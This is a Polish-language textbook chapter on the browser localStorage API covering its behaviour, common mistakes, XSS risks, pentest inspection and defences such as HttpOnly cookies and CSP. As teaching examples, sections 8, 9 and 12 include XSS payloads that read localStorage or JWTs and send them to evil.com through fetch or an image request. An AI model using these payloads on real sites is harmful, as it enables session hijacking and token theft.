# Rozdział 15: localStorage

## 1. Czym jest localStorage

**localStorage** to Web Storage API umożliwiające przechowywanie par klucz-wartość w przeglądarce użytkownika. Dane w localStorage są **persistentne** — przeżywają zamknięcie przeglądarki, restarty systemu i istnieją do momentu świadomego usunięcia przez kod lub użytkownika.

localStorage jest Web API definiowanym przez WHATWG HTML Living Standard. Dostępne jako właściwość `window.localStorage`.

### Właściwości

- **Pojemność**: zazwyczaj 5–10 MB per origin (zależy od przeglądarki)
- **Typ danych**: tylko stringi (klucz i wartość muszą być stringami)
- **Zakres**: per origin (protokół + host + port)
- **Trwałość**: do jawnego usunięcia
- **Wątki**: dostępne TYLKO w głównym wątku (nie w Worker, Service Worker)
- **Synchroniczność**: operacje są synchroniczne (mogą blokować Event Loop!)

### API

```javascript
// Zapis
localStorage.setItem("klucz", "wartość");
localStorage.klucz = "wartość"; // alternatywna składnia (niezalecana)

// Odczyt
const value = localStorage.getItem("klucz");  // null jeśli nie istnieje
const value2 = localStorage.klucz;            // undefined jeśli nie istnieje

// Usuwanie
localStorage.removeItem("klucz");
localStorage.clear(); // usuwa WSZYSTKO dla tego origin

// Iteracja
localStorage.length; // liczba pozycji
localStorage.key(index); // klucz pod indeksem

// Typowy wzorzec z obiektami (serializacja):
localStorage.setItem("user", JSON.stringify({ id: 1, name: "Alice" }));
const user = JSON.parse(localStorage.getItem("user")); // lub null
```

### StorageEvent — synchronizacja między kartami

```javascript
// Inne karty z tym samym origin dostają event gdy localStorage się zmienia
window.addEventListener("storage", function(event) {
    console.log("Klucz:", event.key);
    console.log("Stara wartość:", event.oldValue);
    console.log("Nowa wartość:", event.newValue);
    console.log("URL:", event.url);
    console.log("StorageArea:", event.storageArea === localStorage);
});
// UWAGA: event NIE odpala się w karcie która dokonała zmiany!
```

---

## 2. Dlaczego powstał

### Problem: cookies są nieergonomiczne dla dużych danych

Cookies mają limit 4KB i są automatycznie wysyłane z każdym requestem HTTP — nawet gdy serwer ich nie potrzebuje (marnotrawstwo bandwidths). Do przechowywania stanu UI, preferencji, cache'owanych danych — cookies są złym rozwiązaniem.

Web Storage (localStorage + sessionStorage) zostało zaprojektowane przez WHATWG w 2009 roku jako client-side storage bez automatycznego wysyłania do serwera:

- Duże dane (5+ MB)
- Bez przesyłania z każdym requestem
- Proste API klucz-wartość
- Dostępne przez JavaScript

---

## 3. Jak działa

### Izolacja per Origin

```
https://app.example.com localStorage:
  "theme" → "dark"
  "userId" → "123"

https://api.example.com localStorage:
  (osobna przestrzeń — inny host!)

http://app.example.com localStorage:
  (osobna przestrzeń — inny protokół!)
```

localStorage jest całkowicie izolowany per origin. Nie ma sposobu na dostęp do localStorage innego origin.

### Synchroniczny dostęp — blokada Event Loop

```javascript
// localStorage.getItem() to operacja synchroniczna
// Dla małych danych: szybka (<1ms)
// Dla dużych danych lub gdy dysk jest zajęty: może blokować Event Loop

// Sprawdzenie:
const start = performance.now();
for (let i = 0; i < 100; i++) {
    localStorage.setItem(`key${i}`, "x".repeat(100000)); // 100KB per item
}
console.log(performance.now() - start, "ms"); // może być kilkaset ms
```

### Przechowywanie danych

Przeglądarka przechowuje localStorage w SQLite (Chrome) lub podobnym formacie per origin. Dane są dostępne po restarcie systemu.

### Automatyczne serializowanie

localStorage przechowuje TYLKO stringi. Inne typy są konwertowane:

```javascript
localStorage.setItem("num", 42);    // zapisze "42" (string)
localStorage.getItem("num");        // "42" (string, nie number!)
localStorage.getItem("num") === 42; // false!

localStorage.setItem("bool", true); // "true"
localStorage.setItem("obj", {});    // "[object Object]" — PUŁAPKA!
localStorage.setItem("obj", JSON.stringify({})); // "{}" — poprawnie
```

---

## 4. Co dzieje się wewnętrznie

### Storage Quota

Przeglądarki mają globalne limity storage i mogą żądać od użytkownika potwierdzenia przy przekroczeniu:

```javascript
// Sprawdź dostępne miejsce
navigator.storage.estimate().then(({ quota, usage }) => {
    console.log(`Używane: ${usage} / ${quota} bajtów`);
    // localStorage jest częścią usage
});

// Obsługa QuotaExceededError
try {
    localStorage.setItem("large", "x".repeat(10 * 1024 * 1024)); // 10MB
} catch (e) {
    if (e.name === "QuotaExceededError") {
        // Czyść stare dane i spróbuj ponownie
        localStorage.removeItem("cache");
        localStorage.setItem("large", data);
    }
}
```

### Dostępność

localStorage może być niedostępne:
- Tryb prywatny (Incognito/Private) — zależy od przeglądarki (Chrome: dostępne ale niezapisywane; Safari: może rzucić błąd)
- Polityki organizacyjne blokujące storage
- Przeglądarka bez localStorage (stare wersje)

```javascript
function isLocalStorageAvailable() {
    try {
        localStorage.setItem("test", "test");
        localStorage.removeItem("test");
        return true;
    } catch {
        return false;
    }
}
```

---

## 5. Analogiczny przykład z życia

localStorage to szuflada na biurku:

- Zawiera twoje prywatne rzeczy (per origin)
- Pozostaje po wyjściu z biura (persistentna)
- Każdy pracownik ma własną szufladę (izolacja per origin)
- Można wkładać tylko kartki papieru (stringi)
- Zawartość nie jest wysyłana automatycznie do szefa (nie jak cookies)
- Każdy kto siada przy biurku (JavaScript na tej stronie) ma do niej dostęp

**Atak XSS** = intruz wchodzi do biura i przegląda wszystkie szuflady.

---

## 6. Przykład kodu

```javascript
// === Wzorzec bezpieczniejszego korzystania z localStorage ===

class LocalStorageService {
    constructor(prefix = "app_") {
        this.prefix = prefix;
    }
    
    // Zapis z serializacją
    set(key, value, expiryMinutes = null) {
        const item = {
            value: value,
            timestamp: Date.now()
        };
        
        if (expiryMinutes) {
            item.expiry = Date.now() + (expiryMinutes * 60 * 1000);
        }
        
        try {
            localStorage.setItem(this.prefix + key, JSON.stringify(item));
            return true;
        } catch (e) {
            console.error("localStorage set failed:", e.name);
            return false;
        }
    }
    
    // Odczyt z walidacją i dekodowaniem
    get(key) {
        try {
            const raw = localStorage.getItem(this.prefix + key);
            if (!raw) return null;
            
            const item = JSON.parse(raw);
            
            // Sprawdź expiry
            if (item.expiry && Date.now() > item.expiry) {
                this.remove(key);
                return null;
            }
            
            return item.value;
        } catch {
            return null;
        }
    }
    
    remove(key) {
        localStorage.removeItem(this.prefix + key);
    }
    
    // Wyczyść wszystkie z tym prefiksem
    clearAll() {
        Object.keys(localStorage)
            .filter(k => k.startsWith(this.prefix))
            .forEach(k => localStorage.removeItem(k));
    }
}

// Użycie:
const store = new LocalStorageService("myapp_");
store.set("userPrefs", { theme: "dark", lang: "pl" }); // serializuje do JSON
const prefs = store.get("userPrefs"); // parsuje z JSON

// NIGDY nie rób tak:
// localStorage.setItem("token", authToken); // wrażliwe dane w localStorage!
```

---

## 7. Przykład z prawdziwej aplikacji

### SPA — cache preferencji użytkownika

```javascript
// Store do zarządzania preferencjami (non-sensitive)
const PreferencesStore = {
    save(prefs) {
        // Waliduj dane przed zapisem
        if (typeof prefs.theme !== 'string') return false;
        localStorage.setItem("userPrefs", JSON.stringify(prefs));
        return true;
    },
    
    load() {
        const raw = localStorage.getItem("userPrefs");
        if (!raw) return { theme: "light", language: "en" }; // domyślne
        
        try {
            return JSON.parse(raw);
        } catch {
            localStorage.removeItem("userPrefs"); // usuń uszkodzone dane
            return { theme: "light", language: "en" };
        }
    },
    
    clear() {
        localStorage.removeItem("userPrefs");
    }
};
```

### Aplikacja React — Redux Persist

```javascript
// redux-persist używa localStorage do persystowania stanu Redux
import { persistStore, persistReducer } from 'redux-persist';
import storage from 'redux-persist/lib/storage'; // localStorage

const persistConfig = {
    key: 'root',
    storage,
    // Które fragmenty stanu zapisać
    whitelist: ['userPreferences', 'cart'],
    // Które NIGDY nie zapisywać
    blacklist: ['auth', 'session'] // WRAŻLIWE! Nie zapisuj tokenów
};

// Problem: jeśli 'auth' jest w whitelist → tokeny w localStorage → XSS kradnie
```

---

## 8. Typowe błędy programistów

### Błąd 1: Przechowywanie tokenów autoryzacji

```javascript
// BŁĄD: JWT w localStorage → podatne na XSS!
localStorage.setItem("authToken", jwtToken);

// Każdy XSS może:
const stolenToken = localStorage.getItem("authToken");
fetch("evil.com/steal?t=" + stolenToken);

// POPRAWKA: tokeny w HttpOnly cookies (nie dostępne dla JS)
// Frontend wysyła credentials przez cookies, nie localStorage
```

### Błąd 2: Brak walidacji danych z localStorage

```javascript
// BŁĄD: ufaj temu co czytasz z localStorage
const user = JSON.parse(localStorage.getItem("currentUser"));
if (user.isAdmin) {
    showAdminPanel(); // atakujący mógł zmodyfikować localStorage!
}

// POPRAWKA: zawsze weryfikuj uprawnienia na serwerze
// localStorage to dane klienta — mogą być zmanipulowane!
const response = await fetch("/api/me");
const user = await response.json();
if (user.isAdmin) { showAdminPanel(); }
```

### Błąd 3: Brak obsługi błędów przy QuotaExceededError

```javascript
// BŁĄD: brak obsługi przepełnienia
localStorage.setItem("data", hugeData); // może rzucić QuotaExceededError!

// POPRAWKA:
try {
    localStorage.setItem("data", hugeData);
} catch (e) {
    if (e.name === "QuotaExceededError") {
        // Czyść cache, spróbuj ponownie, lub użyj alternatywnego storage
        clearOldCacheEntries();
    }
}
```

### Błąd 4: Synchroniczne blokowanie Event Loop

```javascript
// BŁĄD: duże dane i wiele operacji blokują UI
function saveAllData(data) {
    Object.entries(data).forEach(([key, value]) => {
        localStorage.setItem(key, JSON.stringify(value)); // synchroniczne!
    });
}

// POPRAWKA dla dużych danych: IndexedDB (asynchroniczne)
// Lub batched setItem przez setTimeout/requestIdleCallback
```

---

## 9. Znaczenie dla bezpieczeństwa

### XSS → localStorage exfiltracja

localStorage jest dostępny dla każdego JavaScript wykonującego się w origin strony. XSS daje pełny dostęp:

```javascript
// Payload XSS — eksfiltracja całego localStorage
const data = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
}

fetch("https://evil.com/steal", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
});
```

**Klucz:** Jeśli aplikacja przechowuje tokeny autoryzacji w localStorage i jest podatna na XSS → atakujący przejmuje sesje wszystkich użytkowników.

### localStorage vs Cookies — porównanie bezpieczeństwa

| Aspekt | localStorage | HttpOnly Cookie |
|--------|-------------|-----------------|
| XSS access | TAK — podatne | NIE — bezpieczne |
| CSRF risk | NIE (nie auto-wysyłane) | TAK (auto-wysyłane) |
| Rozmiar | 5-10 MB | 4 KB |
| HTTP auto-send | NIE | TAK |
| Expiry control | Tylko przez JS | Server-side |
| Szyfrowanie | NIE | NIE (ale Secure=HTTPS) |

**Wniosek:** Dla tokenów sesji — używaj HttpOnly cookies. Dla preferencji UI — localStorage jest OK.

### Podatność na Storage Event Injection

```javascript
// Jeśli aplikacja ufa StorageEvent bez weryfikacji:
window.addEventListener("storage", (e) => {
    if (e.key === "config") {
        applyConfig(JSON.parse(e.newValue)); // czy newValue jest zaufane?
    }
});

// W drugiej karcie tego samego origin (lub przez XSS):
localStorage.setItem("config", JSON.stringify({ dangerousSetting: true }));
// Wyśle StorageEvent do innych kart → mogą zastosować złośliwą konfigurację
```

### Powiązane CWE

- **CWE-312** — Cleartext Storage of Sensitive Information
- **CWE-922** — Insecure Storage of Sensitive Information
- **CWE-79** — XSS (główny wektor dostępu do localStorage)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → Local Storage

1. **Application** (Chrome) / **Storage** (Firefox)
2. **Local Storage** → wybierz domain
3. Przejrzyj wszystkie klucze i wartości:
   - Szukaj: `token`, `auth`, `session`, `jwt`, `access_token`, `refresh_token`
   - Szukaj wrażliwych PII: `email`, `phone`, `card`, `password`
   - Sprawdź strukturę JSON wartości

### Console — pełna inspekcja

```javascript
// W konsoli DevTools — wyświetl cały localStorage
Object.entries(localStorage).forEach(([k, v]) => {
    try {
        const parsed = JSON.parse(v);
        console.log(k, "→", parsed);
    } catch {
        console.log(k, "→", v);
    }
});

// Szukaj tokenów JWT (format: eyXXX.eyXXX.XXX)
Object.entries(localStorage)
    .filter(([k, v]) => v.startsWith("ey"))
    .forEach(([k, v]) => console.log("Potencjalny JWT:", k));
```

### Burp Suite — monitorowanie przez JS injection

```javascript
// W Burp → Proxy → Options → Match and Replace
// Lub w Extension (JS Inject):
// Wstrzyknij skrypt który loguje zmiany localStorage

const origSetItem = Storage.prototype.setItem;
Storage.prototype.setItem = function(key, value) {
    console.log("[localStorage SET]", key, "=", value.substring(0, 100));
    origSetItem.call(this, key, value);
};
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy tokeny JWT/auth są przechowywane w localStorage?
□ Czy wrażliwe PII (email, PESEL, karta) są w localStorage?
□ Czy dane z localStorage są używane do decyzji bezpieczeństwa (isAdmin, role)?
□ Czy aplikacja waliduje dane z localStorage przed użyciem (nie ufa im ślepo)?
□ Czy StorageEvent jest obsługiwany bez walidacji?
□ Czy stare tokeny są usuwane przy wylogowaniu?
□ Czy localStorage jest czyszczone przy wygaśnięciu sesji?
□ Czy dane z localStorage mogą prowadzić do XSS (np. innerHTML = localStorage.getItem)?
□ Czy QuotaExceededError jest obsługiwany?
□ Czy aplikacja działa poprawnie gdy localStorage jest niedostępny (tryb prywatny)?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: XSS → token theft z localStorage

**Wymagania:** Aplikacja SPA przechowuje JWT w localStorage, jest podatna na Stored XSS.

**Przebieg:**
1. Atakujący wstrzykuje Stored XSS w komentarzu/bio
2. Każdy odwiedzający stronę uruchamia XSS
3. Payload eksfiltruje localStorage:
   ```javascript
   const token = localStorage.getItem("jwt_token");
   new Image().src = `https://evil.com/steal?t=${btoa(token)}`;
   ```
4. Atakujący używa tokenu do API requestów jako ofiara

**Wpływ:** Przejęcie kont wszystkich odwiedzających bez konieczności ich haseł.

---

## 13. Jak się zabezpieczać

### Nie przechowuj tokenów w localStorage

```javascript
// ZŁE:
localStorage.setItem("authToken", token);

// DOBRE: tokeny w HttpOnly cookies (zarządzane przez serwer)
// Frontend nigdy nie "widzi" tokenu — przeglądarka wysyła go automatycznie

// Jeśli MUSISZ używać localStorage dla tokenów:
// → Ogranicz scope (SPA bez embedded third-party)
// → Implementuj STRONG CSP
// → Rozważ memory storage (in-memory, nie persystentny)
```

### Waliduj dane z localStorage po stronie serwera

```javascript
// NIGDY nie ufaj localStorage dla decyzji bezpieczeństwa
// Zawsze weryfikuj na serwerze

async function checkAdminAccess() {
    // NIE: if (localStorage.getItem("isAdmin") === "true") return true;
    
    // TAK: sprawdź token na serwerze
    const response = await fetch("/api/auth/me");
    const user = await response.json();
    return user.role === "admin";
}
```

### Szyfrowanie wrażliwych danych (jeśli konieczne)

```javascript
// Jeśli MUSISZ przechować wrażliwe dane client-side:
// Użyj Web Crypto API (szyfrowanie po stronie JS)

async function encryptAndStore(key, data, password) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
        "raw", enc.encode(password), "PBKDF2", false, ["deriveKey"]
    );
    
    const cryptoKey = await crypto.subtle.deriveKey(
        { name: "PBKDF2", salt: enc.encode("salt"), iterations: 100000, hash: "SHA-256" },
        keyMaterial,
        { name: "AES-GCM", length: 256 },
        false, ["encrypt"]
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv }, cryptoKey, enc.encode(JSON.stringify(data))
    );
    
    localStorage.setItem(key, JSON.stringify({
        iv: Array.from(iv),
        data: Array.from(new Uint8Array(encrypted))
    }));
}
```

### CSP jako warstwa obrony

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-...';
    connect-src 'self';
```

Dobra CSP blokuje exfiltrację danych z localStorage przez XSS (blokuje zewnętrzne połączenia).

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. localStorage = persistentny, per-origin, tylko string, synchroniczny, 5-10MB
2. XSS daje pełny dostęp do localStorage — nie przechowuj tam tokenów sesji
3. Tokeny autoryzacji → HttpOnly cookies, nie localStorage
4. Dane z localStorage mogą być zmodyfikowane przez użytkownika — nigdy nie używaj do decyzji bezpieczeństwa bez weryfikacji serwera
5. StorageEvent synchronizuje zmiany między kartami — podatne jeśli serwer ufa tym eventem

**Najczęstsze nieporozumienia:**

- "localStorage jest bezpieczniejszy niż cookies" — to zależy od kontekstu. HttpOnly cookies chronią przed XSS. localStorage nie.
- "localStorage jest niedostępny w trybie prywatnym" — w Chrome jest dostępny (nie zapisywany), w Safari może rzucić wyjątek.
- "Dane w localStorage są szyfrowane" — NIE. Są przechowywane plaintext w SQLite na dysku.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Application → Local Storage** → sprawdź zawartość
2. **Console** → `localStorage.length` → ile kluczy? → `Object.keys(localStorage)`
3. Szukaj JWT (format `eyJ...`) lub tokenów w wartościach
4. Sprawdź przy wylogowaniu czy dane są czyszczone

---

## Powiązania

```
localStorage
    │
    ├──► sessionStorage (Rozdział 16)
    │         Bliźniacze API — sessions scope zamiast persistent
    │
    ├──► IndexedDB (Rozdział 17)
    │         Asynchroniczny, relacyjny, dla dużych danych
    │
    ├──► Cookies (Rozdział 14)
    │         Alternatywny storage — auto-wysyłany do serwera
    │
    ├──► Service Workers (Rozdział 19)
    │         SW NIE ma dostępu do localStorage — używa Cache API i IndexedDB
    │
    └──► CSP (Rozdział 36)
                CSP ogranicza exfiltrację danych z localStorage przez XSS
```
